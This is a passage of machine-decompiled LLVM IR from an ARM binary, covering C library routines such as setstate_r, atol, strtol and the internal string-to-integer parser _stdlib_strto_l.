  store i8 %v1_fc10, i8* %v4_fc10, align 1
  %v0_fc14 = load i32, i32* %r1.global-to-local, align 4
  %v1_fc14 = trunc i32 %v0_fc14 to i8
  %v2_fc14 = load i32, i32* @r5, align 4
  %v3_fc14 = add i32 %v2_fc14, 13
  %v4_fc14 = inttoptr i32 %v3_fc14 to i8*
  store i8 %v1_fc14, i8* %v4_fc14, align 1
  %v0_fc18 = load i32, i32* @r4, align 4
  %v1_fc18 = trunc i32 %v0_fc18 to i8
  %v2_fc18 = load i32, i32* @r5, align 4
  %v3_fc18 = add i32 %v2_fc18, 12
  %v4_fc18 = inttoptr i32 %v3_fc18 to i8*
  store i8 %v1_fc18, i8* %v4_fc18, align 1
  %v0_fc1c = load i32, i32* @r6, align 4
  %v1_fc1c = load i32, i32* @r5, align 4
  %v2_fc1c = add i32 %v1_fc1c, 8
  %v3_fc1c = inttoptr i32 %v2_fc1c to i32*
  store i32 %v0_fc1c, i32* %v3_fc1c, align 4
  %v0_fc20 = load i32, i32* @r5, align 4
  store i32 %v0_fc20, i32* %r1.global-to-local, align 4
  %v0_fc24 = load i32, i32* @r0, align 4
  %v2_fc24 = inttoptr i32 %v0_fc24 to i32*
  %v3_fc24 = call i32 @srandom_r(i32* %v2_fc24, i32 %v0_fc20)
  store i32 %v3_fc24, i32* %r0.global-to-local, align 4
  %v0_fc28 = load i32, i32* @r4, align 4
  %v2_fc28 = icmp eq i32 %v0_fc28, 0
  br i1 %v2_fc28, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_fc4412 = load i32, i32* @r7, align 4
  %v2_fc4413 = inttoptr i32 %v1_fc4412 to i32*
  store i32 0, i32* %v2_fc4413, align 4
  %v1_fc48 = load i32, i32* @r4, align 4
  store i32 %v1_fc48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc78

.thread4:                                         ; preds = %bb26
  %v1_fc2c = load i32, i32* @r5, align 4
  %v2_fc2c = add i32 %v1_fc2c, 4
  %v3_fc2c = inttoptr i32 %v2_fc2c to i32*
  %v4_fc2c = load i32, i32* %v3_fc2c, align 4
  %v1_fc30 = load i32, i32* @r6, align 4
  %v3_fc30 = sub i32 %v4_fc2c, %v1_fc30
  %v4_fc34 = sdiv i32 %v3_fc30, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_fc3c = mul i32 %v4_fc34, 5
  %v5_fc3c = add i32 %v4_fc3c, %v0_fc28
  store i32 %v5_fc3c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_fc44 = load i32, i32* @r7, align 4
  %v2_fc44 = inttoptr i32 %v1_fc44 to i32*
  store i32 0, i32* %v2_fc44, align 4
  %v1_fc4c = load i32, i32* %r3.global-to-local, align 4
  %v2_fc4c = load i32, i32* @r7, align 4
  %v3_fc4c = inttoptr i32 %v2_fc4c to i32*
  store i32 %v1_fc4c, i32* %v3_fc4c, align 4
  %v1_fc80.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc78

dec_label_pc_fc54:                                ; preds = %dec_label_pc_fbd4
  store i32 79104, i32* %r3.global-to-local, align 4
  %v0_fc58 = call i32 @__aeabi_read_tp()
  %v3_fc5c = load i16, i16* @global_var_23164.175, align 2
  %v4_fc5c = sext i16 %v3_fc5c to i32
  store i32 22, i32* %r2.global-to-local, align 4
  %v3_fc64 = add i32 %v4_fc5c, %v0_fc58
  %v4_fc64 = inttoptr i32 %v3_fc64 to i32*
  store i32 22, i32* %v4_fc64, align 4
  store i32 %v4_fc5c, i32* %r3.global-to-local, align 4
  %v0_fc70 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_fc70, i32* %v4_fc64, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc78

dec_label_pc_fc78:                                ; preds = %bb27, %.thread4, %dec_label_pc_fc54
  %v1_fc80 = phi i32 [ %v1_fc80.pre, %.thread4 ], [ %v1_fc48, %bb27 ], [ -1, %dec_label_pc_fc54 ]
  store i32 %v3_fb9c, i32* @r4, align 4
  store i32 %v6_fb9c, i32* @r5, align 4
  ret i32 %v1_fc80

; uselistorder directives
  uselistorder i32 %v4_fc5c, { 1, 0 }
  uselistorder i1 %v7_fbe4, { 1, 0 }
  uselistorder i1 %v7_fbbc, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %dec_label_pc_fc78, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_fc94 = load i32, i32* @r4, align 4
  store i32 %v3_fc94, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v1_fc9c = add i32 %tmp, 12
  %v2_fc9c = inttoptr i32 %v1_fc9c to i8*
  %v3_fc9c = load i8, i8* %v2_fc9c, align 1
  %v4_fc9c = zext i8 %v3_fc9c to i32
  store i32 %v4_fc9c, i32* %r1.global-to-local, align 4
  %v2_fca0 = icmp eq i8 %v3_fc9c, 0
  store i1 %v2_fca0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fca0, label %.thread5, label %.thread6

.thread5:                                         ; preds = %entry
  %v1_fca812 = add i32 %arg1, 4
  store i32 %v1_fca812, i32* %r6.global-to-local, align 4
  %v1_fcac13 = add i32 %tmp, 8
  %v2_fcac14 = inttoptr i32 %v1_fcac13 to i32*
  %v3_fcac15 = load i32, i32* %v2_fcac14, align 4
  store i32 %v3_fcac15, i32* %r0.global-to-local, align 4
  %v3_fcc8 = add i32 %v3_fcac15, -4
  %v4_fcc8 = inttoptr i32 %v3_fcc8 to i32*
  store i32 %v4_fc9c, i32* %v4_fcc8, align 4
  br label %bb

.thread6:                                         ; preds = %entry
  %v2_fca4 = add i32 %tmp, 4
  %v3_fca4 = inttoptr i32 %v2_fca4 to i32*
  %v4_fca4 = load i32, i32* %v3_fca4, align 4
  %v1_fca8 = add i32 %arg1, 4
  store i32 %v1_fca8, i32* %r6.global-to-local, align 4
  %v1_fcac = add i32 %tmp, 8
  %v2_fcac = inttoptr i32 %v1_fcac to i32*
  %v3_fcac = load i32, i32* %v2_fcac, align 4
  store i32 %v3_fcac, i32* %r0.global-to-local, align 4
  %v3_fcb4 = sub i32 %v4_fca4, %v3_fcac
  %v4_fcb8 = sdiv i32 %v3_fcb4, 4
  %v4_fcbc = sext i8 %v3_fc9c to i32
  store i32 %v4_fcbc, i32* %r1.global-to-local, align 4
  %v4_fcc4 = mul i32 %v4_fcb8, 5
  %v5_fcc4 = add i32 %v4_fcc4, %v4_fcbc
  %v3_fccc = add i32 %v3_fcac, -4
  %v4_fccc = inttoptr i32 %v3_fccc to i32*
  store i32 %v5_fcc4, i32* %v4_fccc, align 4
  br label %bb

bb:                                               ; preds = %.thread5, %.thread6
  %v0_fcd0 = load i32, i32* %r6.global-to-local, align 4
  %v1_fcd0 = add i32 %v0_fcd0, -4
  %v2_fcd0 = inttoptr i32 %v1_fcd0 to i32*
  %v3_fcd0 = load i32, i32* %v2_fcd0, align 4
  store i32 %v3_fcd0, i32* %r8.global-to-local, align 4
  %v2_fcdc = udiv i32 %v3_fcd0, 5
  %v3_fcdc = urem i32 %v3_fcd0, 5
  store i32 %v2_fcdc, i32* %r0.global-to-local, align 4
  store i32 %v3_fcdc, i32* %r1.global-to-local, align 4
  %v2_fce4 = icmp ugt i32 %v3_fcdc, 3
  %v7_fce4 = icmp eq i32 %v3_fcdc, 4
  store i1 %v7_fce4, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r5.global-to-local, align 4
  %v2_fcec = xor i1 %v7_fce4, true
  %v3_fcec = and i1 %v2_fce4, %v2_fcec
  br i1 %v3_fcec, label %dec_label_pc_fd54, label %dec_label_pc_fcf0

dec_label_pc_fcf0:                                ; preds = %bb
  %v4_fcf8 = mul nuw nsw i32 %v3_fcdc, 4
  %v5_fcf8 = add i32 %v4_fcf8, add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -35048)
  %v1_fcfc = add i32 %v4_fcf8, add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -35028)
  %v2_fcfc = inttoptr i32 %v1_fcfc to i32*
  %v3_fcfc = load i32, i32* %v2_fcfc, align 4
  store i32 %v3_fcfc, i32* %r5.global-to-local, align 4
  %v6_fd00 = inttoptr i32 %v5_fcf8 to i32*
  %v7_fd00 = load i32, i32* %v6_fd00, align 4
  store i32 %v7_fd00, i32* %r7.global-to-local, align 4
  %v2_fd04 = icmp eq i32 %v3_fcdc, 0
  store i1 %v2_fd04, i1* %cpsr_z.global-to-local, align 1
  %v1_fd08 = trunc i32 %v3_fcfc to i8
  %v2_fd08 = load i32, i32* %r4.global-to-local, align 4
  %v3_fd08 = add i32 %v2_fd08, 13
  %v4_fd08 = inttoptr i32 %v3_fd08 to i8*
  store i8 %v1_fd08, i8* %v4_fd08, align 1
  %v0_fd0c = load i32, i32* %r7.global-to-local, align 4
  %v1_fd0c = trunc i32 %v0_fd0c to i8
  %v2_fd0c = load i32, i32* %r4.global-to-local, align 4
  %v3_fd0c = add i32 %v2_fd0c, 14
  %v4_fd0c = inttoptr i32 %v3_fd0c to i8*
  store i8 %v1_fd0c, i8* %v4_fd0c, align 1
  %v0_fd10 = load i32, i32* %r1.global-to-local, align 4
  %v1_fd10 = trunc i32 %v0_fd10 to i8
  %v2_fd10 = load i32, i32* %r4.global-to-local, align 4
  %v3_fd10 = add i32 %v2_fd10, 12
  %v4_fd10 = inttoptr i32 %v3_fd10 to i8*
  store i8 %v1_fd10, i8* %v4_fd10, align 1
  %v0_fd14 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fd14, label %dec_label_pc_fd40, label %dec_label_pc_fd18

dec_label_pc_fd18:                                ; preds = %dec_label_pc_fcf0
  %v0_fd1c = load i32, i32* %r8.global-to-local, align 4
  %v2_fd20 = sdiv i32 %v0_fd1c, 5
  store i32 %v2_fd20, i32* %r0.global-to-local, align 4
  %v0_fd24 = load i32, i32* %r6.global-to-local, align 4
  %v4_fd24 = mul i32 %v2_fd20, 4
  %v5_fd24 = add i32 %v4_fd24, %v0_fd24
  %v1_fd28 = load i32, i32* %r4.global-to-local, align 4
  %v2_fd28 = add i32 %v1_fd28, 4
  %v3_fd28 = inttoptr i32 %v2_fd28 to i32*
  store i32 %v5_fd24, i32* %v3_fd28, align 4
  %v0_fd2c = load i32, i32* %r7.global-to-local, align 4
  %v1_fd2c = load i32, i32* %r0.global-to-local, align 4
  %v2_fd2c = add i32 %v1_fd2c, %v0_fd2c
  %v0_fd30 = load i32, i32* %r5.global-to-local, align 4
  %v2_fd34 = udiv i32 %v2_fd2c, %v0_fd30
  %v3_fd34 = urem i32 %v2_fd2c, %v0_fd30
  store i32 %v2_fd34, i32* %r0.global-to-local, align 4
  %v0_fd38 = load i32, i32* %r6.global-to-local, align 4
  %v4_fd38 = mul i32 %v3_fd34, 4
  %v5_fd38 = add i32 %v0_fd38, %v4_fd38
  store i32 %v5_fd38, i32* %r1.global-to-local, align 4
  %v1_fd3c = load i32, i32* %r4.global-to-local, align 4
  %v2_fd3c = inttoptr i32 %v1_fd3c to i32*
  store i32 %v5_fd38, i32* %v2_fd3c, align 4
  br label %dec_label_pc_fd40

dec_label_pc_fd40:                                ; preds = %dec_label_pc_fcf0, %dec_label_pc_fd18
  %v0_fd40 = load i32, i32* %r6.global-to-local, align 4
  %v1_fd40 = load i32, i32* %r5.global-to-local, align 4
  %v4_fd40 = mul i32 %v1_fd40, 4
  %v5_fd40 = add i32 %v4_fd40, %v0_fd40
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_fd48 = load i32, i32* %r4.global-to-local, align 4
  %v2_fd48 = add i32 %v1_fd48, 16
  %v3_fd48 = inttoptr i32 %v2_fd48 to i32*
  store i32 %v5_fd40, i32* %v3_fd48, align 4
  %v0_fd4c = load i32, i32* %r6.global-to-local, align 4
  %v1_fd4c = load i32, i32* %r4.global-to-local, align 4
  %v2_fd4c = add i32 %v1_fd4c, 8
  %v3_fd4c = inttoptr i32 %v2_fd4c to i32*
  store i32 %v0_fd4c, i32* %v3_fd4c, align 4
  %v1_fd70.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fd6c

dec_label_pc_fd54:                                ; preds = %bb
  %v0_fd58 = call i32 @__aeabi_read_tp()
  %v3_fd5c = load i16, i16* @global_var_23164.175, align 2
  %v4_fd5c = sext i16 %v3_fd5c to i32
  %v3_fd64 = add i32 %v4_fd5c, %v0_fd58
  %v4_fd64 = inttoptr i32 %v3_fd64 to i32*
  store i32 22, i32* %v4_fd64, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fd6c

dec_label_pc_fd6c:                                ; preds = %dec_label_pc_fd40, %dec_label_pc_fd54
  %v1_fd70 = phi i32 [ %v1_fd70.pre, %dec_label_pc_fd40 ], [ -1, %dec_label_pc_fd54 ]
  %v2_fd6c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_fd6c, i32* @r4, align 4
  ret i32 %v1_fd70

; uselistorder directives
  uselistorder i32 %v0_fd30, { 1, 0 }
  uselistorder i32 %v2_fd2c, { 1, 0 }
  uselistorder i32 %v3_fcd0, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 4, 5, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 1, 2, 3, 4, 8, 9, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -35048), { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fd6c, { 1, 0 }
  uselistorder label %dec_label_pc_fd40, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_fd90 = call i32 @strtol()
  ret i32 %v0_fd90
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_fdac = call i32 @_stdlib_strto_l()
  ret i32 %v0_fdac
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %ip.global-to-local, align 4
  %v0_fdd0 = load i32, i32* @r1, align 4
  store i32 %v0_fdd0, i32* %sb.global-to-local, align 4
  %v0_fdd4 = load i32, i32* @r2, align 4
  store i32 %v0_fdd4, i32* %r5.global-to-local, align 4
  %v0_fdd8 = load i32, i32* @r0, align 4
  store i32 %v0_fdd8, i32* %r4.global-to-local, align 4
  %v0_fddc = load i32, i32* @r3, align 4
  br label %dec_label_pc_fde8

dec_label_pc_fde4:                                ; preds = %dec_label_pc_fde8
  %v1_fde4 = add i32 %v0_fe20, 1
  store i32 %v1_fde4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fde8

dec_label_pc_fde8:                                ; preds = %entry, %dec_label_pc_fde4
  %v0_fe20 = phi i32 [ %v0_fdd8, %entry ], [ %v1_fde4, %dec_label_pc_fde4 ]
  %v1_fde8 = inttoptr i32 %v0_fe20 to i8*
  %v2_fde8 = load i8, i8* %v1_fde8, align 1
  %v3_fde8 = zext i8 %v2_fde8 to i32
  store i32 %v3_fde8, i32* %r1.global-to-local, align 4
  %v4_fdec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 800) to i32*), align 4
  %v2_fdf0 = mul nuw nsw i32 %v3_fde8, 2
  %v2_fdf4 = add i32 %v2_fdf0, %v4_fdec
  %v3_fdf4 = inttoptr i32 %v2_fdf4 to i16*
  %v4_fdf4 = load i16, i16* %v3_fdf4, align 2
  %v1_fdf8 = and i16 %v4_fdf4, 32
  %v2_fdf8 = icmp eq i16 %v1_fdf8, 0
  br i1 %v2_fdf8, label %dec_label_pc_fe00, label %dec_label_pc_fde4

dec_label_pc_fe00:                                ; preds = %dec_label_pc_fde8
  %v7_fe00 = icmp eq i8 %v2_fde8, 43
  br i1 %v7_fe00, label %dec_label_pc_fe20, label %dec_label_pc_fe08

dec_label_pc_fe08:                                ; preds = %dec_label_pc_fe00
  %v7_fe08 = icmp eq i8 %v2_fde8, 45
  br i1 %v7_fe08, label %dec_label_pc_fe20, label %bb

bb:                                               ; preds = %dec_label_pc_fe08
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_fe24

dec_label_pc_fe20:                                ; preds = %dec_label_pc_fe00, %dec_label_pc_fe08
  %storemerge47 = phi i32 [ 1, %dec_label_pc_fe08 ], [ 0, %dec_label_pc_fe00 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_fe20 = add i32 %v0_fe20, 1
  store i32 %v1_fe20, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fe24

dec_label_pc_fe24:                                ; preds = %bb, %dec_label_pc_fe20
  %v0_fe44 = phi i32 [ %v0_fe20, %bb ], [ %v1_fe20, %dec_label_pc_fe20 ]
  %v1_fe24 = and i32 %v0_fdd4, -17
  %v3_fe24 = icmp eq i32 %v1_fe24, 0
  br i1 %v3_fe24, label %dec_label_pc_fe30, label %bb60

bb60:                                             ; preds = %dec_label_pc_fe24
  br label %bb64

dec_label_pc_fe30:                                ; preds = %dec_label_pc_fe24
  %v1_fe30 = inttoptr i32 %v0_fe44 to i8*
  %v2_fe30 = load i8, i8* %v1_fe30, align 1
  %v7_fe34 = icmp eq i8 %v2_fe30, 48
  %v1_fe38 = add i32 %v0_fdd4, 10
  store i32 %v1_fe38, i32* %r5.global-to-local, align 4
  br i1 %v7_fe34, label %dec_label_pc_fe44, label %bb61

bb61:                                             ; preds = %dec_label_pc_fe30
  br label %.thread8

dec_label_pc_fe44:                                ; preds = %dec_label_pc_fe30
  %v1_fe44 = add i32 %v0_fe44, 1
  %v2_fe44 = inttoptr i32 %v1_fe44 to i8*
  %v3_fe44 = load i8, i8* %v2_fe44, align 1
  %v4_fe44 = zext i8 %v3_fe44 to i32
  store i32 %v1_fe44, i32* %r4.global-to-local, align 4
  %v1_fe48 = or i32 %v4_fe44, 32
  %v7_fe4c = icmp eq i32 %v1_fe48, 120
  %v1_fe50 = add i32 %v0_fdd4, 8
  store i32 %v1_fe50, i32* %r5.global-to-local, align 4
  br i1 %v7_fe4c, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_fe44
  %v3_fe5c = mul i32 %v1_fe50, 2
  store i32 %v3_fe5c, i32* %r5.global-to-local, align 4
  %v2_fe60 = add i32 %v0_fe44, 2
  store i32 %v2_fe60, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_fe44, %bb61, %bb62
  %v1_ff3430 = phi i32 [ %v0_fdd8, %bb61 ], [ %v1_fe44, %bb62 ], [ %v1_fe44, %dec_label_pc_fe44 ]
  %v0_feb021 = phi i32 [ %v0_fe44, %bb61 ], [ %v2_fe60, %bb62 ], [ %v1_fe44, %dec_label_pc_fe44 ]
  %v0_fe64 = phi i32 [ %v1_fe38, %bb61 ], [ %v3_fe5c, %bb62 ], [ %v1_fe50, %dec_label_pc_fe44 ]
  %v5_fe68 = icmp slt i32 %v0_fe64, 16
  br i1 %v5_fe68, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_ff3429 = phi i32 [ %v0_fdd8, %bb60 ], [ %v1_ff3430, %.thread8 ], [ %v1_ff3430, %bb63 ]
  %v0_feb020 = phi i32 [ %v0_fe44, %bb60 ], [ %v0_feb021, %.thread8 ], [ %v0_feb021, %bb63 ]
  %v0_fe90 = phi i32 [ %v0_fdd4, %bb60 ], [ %v0_fe64, %.thread8 ], [ 16, %bb63 ]
  %v1_fe6c = add i32 %v0_fe90, -2
  %tmp = icmp ugt i32 %v1_fe6c, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_fe7c

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ff30

dec_label_pc_fe7c:                                ; preds = %bb64
  %v2_fe84 = udiv i32 -1, %v0_fe90
  %v3_fe84 = urem i32 -1, %v0_fe90
  store i32 %v0_fe90, i32* %r1.global-to-local, align 4
  %v1_fe94 = urem i32 %v3_fe84, 256
  store i32 %v1_fe94, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_fe84, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_feb0

dec_label_pc_feac:                                ; preds = %bb71, %dec_label_pc_ff0c
  %v0_feac = phi i32 [ %v1_feec44, %bb71 ], [ %v0_feac.pre, %dec_label_pc_ff0c ]
  br label %dec_label_pc_feb0

dec_label_pc_feb0:                                ; preds = %dec_label_pc_fe7c, %dec_label_pc_feac
  %v1_ff3427 = phi i32 [ %v1_ff3429, %dec_label_pc_fe7c ], [ %v0_feac, %dec_label_pc_feac ]
  %v0_feec = phi i32 [ %v0_feb020, %dec_label_pc_fe7c ], [ %v0_feac, %dec_label_pc_feac ]
  %v1_feb0 = inttoptr i32 %v0_feec to i8*
  %v2_feb0 = load i8, i8* %v1_feb0, align 1
  %v3_feb0 = zext i8 %v2_feb0 to i32
  %v1_feb4 = add nsw i32 %v3_feb0, -48
  %v1_feb8 = urem i32 %v1_feb4, 256
  store i32 %v1_feb8, i32* %r1.global-to-local, align 4
  %v1_fec0 = or i32 %v3_feb0, 32
  %tmp79 = icmp ult i32 %v1_feb8, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_fec8

dec_label_pc_fec8:                                ; preds = %dec_label_pc_feb0
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_fec0, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_fec8
  %v1_fecc = add nsw i32 %v1_fec0, -87
  %v5_fed4 = urem i32 %v1_fecc, 256
  store i32 %v5_fed4, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_feb0, %dec_label_pc_fec8, %bb65
  %v3_ff04 = phi i32 [ %v1_feb8, %dec_label_pc_feb0 ], [ 40, %dec_label_pc_fec8 ], [ %v5_fed4, %bb65 ]
  %v1_fed8 = load i32, i32* %r5.global-to-local, align 4
  %v6_fedc = icmp slt i32 %v3_ff04, %v1_fed8
  br i1 %v6_fedc, label %dec_label_pc_fee0, label %dec_label_pc_ff30.loopexit

dec_label_pc_fee0:                                ; preds = %bb66
  %v0_fee0 = load i32, i32* %ip.global-to-local, align 4
  %v1_fee0 = load i32, i32* %r8.global-to-local, align 4
  %v9_fee0 = icmp eq i32 %v0_fee0, %v1_fee0
  br i1 %v9_fee0, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_fee0
  %v1_feec40 = add i32 %v0_feec, 1
  store i32 %v1_feec40, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fef4

bb67:                                             ; preds = %dec_label_pc_fee0
  %v3_fee0 = icmp ult i32 %v0_fee0, %v1_fee0
  %v1_feec = add i32 %v0_feec, 1
  store i32 %v1_feec, i32* %r4.global-to-local, align 4
  br i1 %v3_fee0, label %dec_label_pc_fef4, label %dec_label_pc_ff0c

dec_label_pc_fef4:                                ; preds = %bb67, %.thread39
  %v1_feec44 = phi i32 [ %v1_feec40, %.thread39 ], [ %v1_feec, %bb67 ]
  %v4_fefc2443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_fef4 = load i32, i32* %sl.global-to-local, align 4
  %v3_fef4 = icmp uge i32 %v3_ff04, %v1_fef4
  %v9_fef4 = icmp eq i32 %v3_ff04, %v1_fef4
  %v2_fef8 = xor i1 %v3_fef4, true
  %v3_fef8 = or i1 %v9_fef4, %v2_fef8
  br i1 %v3_fef8, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_fef4
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_fef4, %bb68
  %v4_fefc = phi i32 [ %v4_fefc2443, %dec_label_pc_fef4 ], [ 0, %bb68 ]
  %v2_fefc = xor i1 %v9_fef4, true
  %v3_fefc = and i1 %v3_fef4, %v2_fefc
  br i1 %v3_fefc, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_fefc = urem i32 %v4_fefc, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_ff00 = phi i32 [ %v5_fefc, %bb70 ], [ %v4_fefc, %bb69 ]
  %v2_ff00 = icmp eq i32 %v0_ff00, 0
  br i1 %v2_ff00, label %bb71, label %dec_label_pc_ff0c

bb71:                                             ; preds = %thread-pre-split
  %v4_ff04 = mul i32 %v0_fee0, %v1_fed8
  %v5_ff04 = add i32 %v4_ff04, %v3_ff04
  store i32 %v5_ff04, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_feac

dec_label_pc_ff0c:                                ; preds = %bb67, %thread-pre-split
  %v0_ff14 = call i32 @__aeabi_read_tp()
  %v0_ff18 = load i32, i32* %r7.global-to-local, align 4
  %v2_ff18 = and i32 %v0_fddc, %v0_ff18
  store i32 %v2_ff18, i32* %r7.global-to-local, align 4
  %v0_ff1c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_ff1c, i32* %ip.global-to-local, align 4
  %v3_ff20 = load i16, i16* @global_var_23164.175, align 2
  %v4_ff20 = sext i16 %v3_ff20 to i32
  %v3_ff28 = add i32 %v4_ff20, %v0_ff14
  %v4_ff28 = inttoptr i32 %v3_ff28 to i32*
  store i32 34, i32* %v4_ff28, align 4
  %v0_feac.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_feac

dec_label_pc_ff30.loopexit:                       ; preds = %bb66
  %v0_ff30.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_ff30

dec_label_pc_ff30:                                ; preds = %.thread, %dec_label_pc_ff30.loopexit
  %v1_ff34 = phi i32 [ %v1_ff3427, %dec_label_pc_ff30.loopexit ], [ %v1_ff3429, %.thread ]
  %v2_ff34 = phi i32 [ %v0_ff30.pre, %dec_label_pc_ff30.loopexit ], [ %v0_fdd0, %.thread ]
  %v2_ff30 = icmp eq i32 %v2_ff34, 0
  br i1 %v2_ff30, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_ff30
  %v3_ff34 = inttoptr i32 %v2_ff34 to i32*
  store i32 %v1_ff34, i32* %v3_ff34, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_ff30, %bb72
  %v0_ff3c = load i32, i32* %r7.global-to-local, align 4
  %v2_ff3c = icmp eq i32 %v0_ff3c, 0
  %. = select i1 %v2_ff3c, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_ff48 = icmp eq i32 %v0_fddc, 0
  %v0_ff74.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_ff48, label %dec_label_pc_ff6c, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_ff74.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_ff54, label %dec_label_pc_ff6c

dec_label_pc_ff54:                                ; preds = %bb76
  %v0_ff58 = call i32 @__aeabi_read_tp()
  %v3_ff5c = load i16, i16* @global_var_23164.175, align 2
  %v4_ff5c = sext i16 %v3_ff5c to i32
  %v3_ff64 = add i32 %v4_ff5c, %v0_ff58
  %v4_ff64 = inttoptr i32 %v3_ff64 to i32*
  store i32 34, i32* %v4_ff64, align 4
  %v0_ff68 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_ff68, i32* %ip.global-to-local, align 4
  %v0_ff6c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ff6c

dec_label_pc_ff6c:                                ; preds = %bb76, %bb73, %dec_label_pc_ff54
  %v0_ff74.pre = phi i32 [ %v0_ff74.pre.pre, %bb76 ], [ %v0_ff68, %dec_label_pc_ff54 ], [ %v0_ff74.pre.pre, %bb73 ]
